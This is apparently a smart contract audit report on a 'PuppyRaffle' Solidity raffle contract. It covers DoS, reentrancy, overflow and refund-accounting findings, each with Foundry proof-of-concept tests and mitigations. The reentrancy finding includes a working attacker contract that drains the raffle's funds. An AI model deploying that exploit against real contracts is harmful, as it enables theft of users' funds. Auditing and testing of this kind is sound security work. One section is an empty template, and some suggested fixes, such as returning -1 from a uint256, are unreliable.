### [M-1] Potencial DoS attack checking duplicate players

**Description:** On the function `PuppyRaffle::enterRaffle` is using two `for` loops(one inside another) to check that can't enter duplicate players:
```javascript
for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```
This means that the more players are on the raffle the more is going to cost on gas to enter to the raffle.

**Impact:** People potencially could not enter to the raffle due to the high gas cost checking if it is a duplicate player

**Proof of Concept:**Proof of code:
If we have two sets of 100 players to enter, the gas costs will be as such:
- 1st 100 players: ~6252047 gas
- 2st 100 players: ~18068137 gas

<details>
<summary>PoC</summary>

Here we write a test entering first 100 players to raffle and calculating the gas cost of this 100 players, then we do a second round of another 100 players and we compare the gas cost of the two rounds. You can paste this on the `PuppyRaffleTest.t.sol`:
```javascript
function testDosOnForLoopCheckingDuplicatePlayers() public {
        vm.txGasPrice(1);
        
        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(i);
        }

        // How much gas costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first 100 players: ", gasUsedFirst);


        // Second round of 100 players to enter to the raffle to see the difference of gas
        address[] memory playersTwo = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            playersTwo[i] = address(i + numPlayers); // 0, 1, 2 --> 100, 101, 102
        }

        // How much gas costs
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo);
        uint256 gasEnd2 = gasleft();
        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
        console.log("Gas cost of the second 100 players: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```

</details>

**Recommended Mitigation:** There are a few recomendations:

1. Consider allowing duplicates. Users can make a new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.


### [M-2] Smart contract wallets raffle winners without a `receive` and `fallback` function will block the start of a new contest

**Description:** The `puppyRaffle::selectWinner` function is responsible for resseting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Users could easily call the `selectWinner` function again and non-wallet entrants could enter, but it could cost a lot of gas due to the duplicate check and a lottery reset could get very challenging.

**Impact:** The `puppyRaffle::selectWinner` function could revert many times, making the lottery reset difficult.

Also, true winners would not get paid out and someone else could take their money!

**Proof of Concept:**Paste the following code to `PuppyRaffleTest.t.sol`.

<details>
<summary>Proof of Code</summary>

1. Enter 4 players that are smart contract wallets without the `receive` and `fallback` function.
2. Pass some time of teh raffle.
3. Try to select the winner reverting on `Failed to sent prize pool to winner`

The test:

```javascript
function testRevertsWhenPrizePoolIsSent() public {
        UserWallet userOne = new UserWallet();
        UserWallet userTwo = new UserWallet();
        UserWallet userThree = new UserWallet();
        UserWallet userFour = new UserWallet();
        address[] memory players = new address[](4);
        players[0] = address(userOne);
        players[1] = address(userTwo);
        players[2] = address(userThree);
        players[3] = address(userFour);

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);


        vm.expectRevert();
        puppyRaffle.selectWinner();

    }

```


The empty smart contract wallet:

```javascript
contract UserWallet {
    constructor() {}
}
```


</details>

**Recommended Mitigation:** There's a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended).
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves with a new `claimPrize`  function, putting the owness of the winner to claim their prize (recomended).

>PULL over PUSH




### [H-1] Potential reentrancy on `PuppyRaffle::refund` function

**Description:** Could be a potential reentrancy attack to steal all the value from the raffle on the `PuppyRaffle::refund` function:
<details>
<summary>Function refund</summary>

```javascript

    /// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
    /// @dev This function will allow there to be blank spots in the array
    // @audit reentrancy propable
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```
</details>

We make a external call to send value(`payable(msg.sender).sendValue(entranceFee);`) before we update the state of the player(`players[playerIndex] = address(0);`). That means that using the functions `fallback` or `receive` from the contract that interact with (the attacker contract), we can call again the function `PuppyRaffle::refund` repeatedly and drain the funds of the `PuppyRaffle` contract to zero.

**Impact:** Potential risk of loosing all the value from the `PuppyRaffle` contract, stealing all the funds of the other users that participate in the raffle.

**Proof of Concept:**Proof of code
Below is a test and a contract (attacker)that you can paste on `PuppyRaffleTest.t.sol` and check that we drain the funds of the raffle:

<details>
<summary>Test Code</summary>

So if we create a separate contract, creating a couple of functions:
1. Function `attack`: We enter the raffle with the entrance fee and we call inmediatly the `refund` function.
2. When the `refund` function is called, before updating our state to `address(0)` is going to send value (the refund) to the attacker contract interacting directly with the `receive` or `fallback` functions.
3. When one of this two functions (`fallback` and `receive`) is triggered, is going to call again the refund function.
4. Thus, making a loop and end draining the `PuppyRaffle` contract.


The contract attacker to make the reentrancy attack:

```javascript
contract ReentrancyAttack  {

    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRafle) {
        puppyRaffle = _puppyRafle;
        entranceFee = puppyRaffle.entranceFee();

    }


    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}

```


The test to validate the reentrancy attack:

```javascript
function testReentrancyRefund() public{
        // Players enter the raffle
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // Calculate the balance before the attack

        uint256 balanceRaffleBefore = address(puppyRaffle).balance;
        console.log("Balance of raffle before the attack: ", balanceRaffleBefore);
        ReentrancyAttack reentrancy = new ReentrancyAttack(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        
        vm.prank(attacker);
        reentrancy.attack{value: entranceFee}();

        uint256 balanceRaffleAfter = address(puppyRaffle).balance;
        console.log("Balance of raffle after the attack: ", balanceRaffleAfter);

        // balance of the contract attack
        uint256 balanceReentrancyAfterAttack = address(reentrancy).balance;
        console.log("Balance of reentrancy contract: ", balanceReentrancyAfterAttack);


        assert(balanceRaffleBefore > balanceRaffleAfter);
        assertEq(balanceReentrancyAfterAttack, entranceFee*5);    
        
    }
```

</details>

**Recommended Mitigation:** You have a couple of options:
1. Change the state of the user before sending the value:

```diff
/// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
    /// @dev This function will allow there to be blank spots in the array
    // @audit reentrancy propable
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
        payable(msg.sender).sendValue(entranceFee);

-       players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

2. Using the modifier `nonreentrant` from OpenZeppelin libraries. You will need to install and import the openzeppelin contracts for using this modifier:

```diff
+ import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

```

```diff
+ function refund(uint256 playerIndex) public nonReentrant {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```



### [H-#] Weak randomness, guess the random number

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 


### [H-2] Overflow on `PuppyRaffle::totalFees` variable, potential unavailable success call to `puppyRaffle::withdrawFees`

**Description:** In the function `puppyRaffle::selectWinner`, after setting the prizePool and fee of the raffle (80%, 20% respectively):
```javascript
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
``` 
It add the fee of the raffle to the `puppyRaffle::totalFees` variable, typecasting the fee variable to `uint64` because the `puppyRaffle::totalFees` is of type `uint64`:
```javascript
totalFees = totalFees + uint64(fee);
```
The problem is when we surpass the maximum value of `uint64` it doesn't revert but it sets the `totalFees` variable a number less than it should. So when the prizePool is sent to the winner, the rest 20% (fee) is the balance of the contract (assuming is the first raffle,  but can happen on later raffles, the condition is that it has to surpass the maximum value of `uint64 totalFees`).

So when we try to call the function `puppyRaffle::withdrawFees` could be unavailable, allways reverting in this line:
```javascript
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```
Because this has to be true `address(this).balance == uint256(totalFees)`, so the funds to withdraw could be locked on the contract.

**Impact:** Lock owner funds on `PuppyRaffle` contract.

**Proof of Concept:** Here I leave you a test to paste on `PuppyRaffleTest.t.sol`:

<details>
<summary>Proof of Code</summary>

We start the raffle with 100 players as the minimum players (in one raffle round) to surpass the maximum value of `uint64 totalFees` is ~95 players.
I leave some `console.log` to see the actual data:

```javascript
// We need at least 95 (19 ether on total fees) players to overflow the total fees, as we know that the max amount of uint64 is ~18 ether
    function testOverflowLockFeesIntoTheContract() public {
        // we put 100 players
        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);

        // Pass some time to finish the raffle duration
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        
        console.log("Balance of the contract before selecting the winner: ", address(puppyRaffle).balance);

        // We select the winner
        puppyRaffle.selectWinner();
        uint256 fees = uint256(puppyRaffle.totalFees());
        console.log("fees cost of the first 100 players: ", fees);
        console.log("balance of the contract after selecting a winner: ", address(puppyRaffle).balance);

        // We can't withdraw the fees because the balance of the contract is not equal to the totalFees.
        vm.expectRevert();
        puppyRaffle.withdrawFees();   
    }
```


### This would be a separate high severity bug
Although you can `selfdescruct` an external contract and force to send some value to the `PuppyRaffle` contract, then getting unavailable again the `puppyRaffle::withdrawFees` function. 



</details>

**Recommended Mitigation:** You have some options:

1. Instead of setting the variable to `uint64` set it as `uint256`, if it overflows it will revert. 
2. You can set some variable of `maximumNumberOfPlayersOnoneRaffle` so it wil never revert. You can so it for `uint64` and `uint256`.
3. A part from this, you can withdraw directly the fees to the contract when the winner is selected.




### [H-3] Winner doens't get the prizePool if someone refund (out of funds)

**Description:** In `puppyRaffle::refund` function, when someone refund the address slot of that player sets to `address(0)`:
```javascript
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        // @audit reentrancy propable
        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```

What happens then, is that when `selectWinner` is called, first is going to check if there's at least four players, but the problem is that they don't have any checkers for the addresses that refunded `require(players.length >= 4, "PuppyRaffle: Need at least 4 players");` so `address(0)` counts as a player as well. Then when the `prizePool` is calculated 
```javascript
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
```
it multiplies the `puppyRaffle::players.length `with the `puppyRaffle::entranceFee`, then when the `prizePool` is sent to the winner it reverts `Out of funds` because it calculated the funds for the addresses that refunded, so the balance of the contract is violated and are not enough funds to send.
```javascript
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
``` 

**Impact:** Winner doesn't take the `prizePool` and totalFees are wrong

**Proof of Concept:** I leave you a test to paste in `PuppyRaffleTest.t.sol`:
1. Four players enters to the raffle:
    - Balance of the contract: 4 ether
2. One player refund:
    - Balance of the contract: 3 ether
3. Pass some time and we call puppyRaffle::selectWinner
    - `puppyRaffle::totalAmountCollected`: 4 ether
    - `puppyRaffle::prizePool`: 3.2 ether
    - `puppyRaffle::fee`: 0.8 ether
    - Balance of the contract: 3 ether
It fails to send 3.2 ether to the winner, `Out of funds`

<details>
<summary>PoC</summary>

```javascript
function testAddress0ParticipatesToTheRaffle() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        // Refund one
        vm.prank(playerThree);
        puppyRaffle.refund(2);
        console.log("Address of the playerTwo after refund: ", puppyRaffle.players(2));

        // Pass some time to finish the raffle duration
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Should not work selectWinner because now we have three players
        vm.expectRevert();
        puppyRaffle.selectWinner();
        console.log("Winner: ", puppyRaffle.previousWinner());

    }
```

</details>

**Recommended Mitigation:** Couple of options:
1. When someone refunds delete directly the slot of the address that refunded instead of setting to address 0.
2. Check on selectWinner the participants that not address(0), then when calculated the `totalAmountCollected`, you can calculate with `address(this).balance` and then check that the balance is correct based on the number of players.


### [L-1] The first player to enter the raffle may think that is not in the raffle due to the return value of `puppyRaffle::getActivePlayerIndex` function 

**Description:** In the function `puppyRaffle::getActivePlayerIndex`, according to natSpec if you are not in the raffle (not active) is going to return `0`, as well if you try to check if the first player that entered the raffle is active, is going to return `0` as well.

```javascript
/// @notice a way to get the index in the array
    /// @param player the address of a player in the raffle
    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** Player may think is not in the raffle, trying to enter again and waste gas

**Proof of Concept:**
1. The first player enters the raffle
2. Checks if it's active player and gets `0` (index `0`).
3. HE tries to enter again thinking is not active.

**Recommended Mitigation:** Couple of options:
1. Instead of returning 0, it can revert if you are not active.
2. Returning `-1` if you are not active is another solution